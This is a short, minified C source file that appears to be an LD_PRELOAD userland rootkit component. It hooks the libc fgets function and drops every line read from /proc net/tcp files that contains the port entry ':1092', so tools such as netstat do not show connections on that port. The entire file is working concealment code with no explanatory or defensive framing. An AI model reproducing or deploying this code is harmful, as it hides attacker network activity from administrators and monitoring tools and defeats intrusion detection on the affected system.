#define _GNU_SOURCE
#include<stdio.h>
#include<dlfcn.h>
#include<unistd.h>
#include<string.h>
static int get_file_name(FILE*f,char*buf,size_t size){int fd;char tmp[64];ssize_t ret;fd=fileno(f);if(fd<0)return 0;snprintf(tmp,sizeof(tmp),"/proc/self/fd/%d",fd);ret=readlink(tmp,buf,size);if(ret<0)return 0;buf[ret]=0;return 1;}static char*(*original_fgets)(char*,int,FILE*)=0;char*fgets(char*s,int sz,FILE*st){if(original_fgets==0){original_fgets=dlsym(RTLD_NEXT,"fgets");if(original_fgets==0){return 0;}}char*ret;while(1){ret=original_fgets(s,sz,st);if(ret){char file_name[256];if(get_file_name(st,file_name,256)&&strstr(file_name,"/proc/")&&strstr(file_name,"/net/tcp")&&strstr(ret,":1092 "))continue;}break;}return ret;}
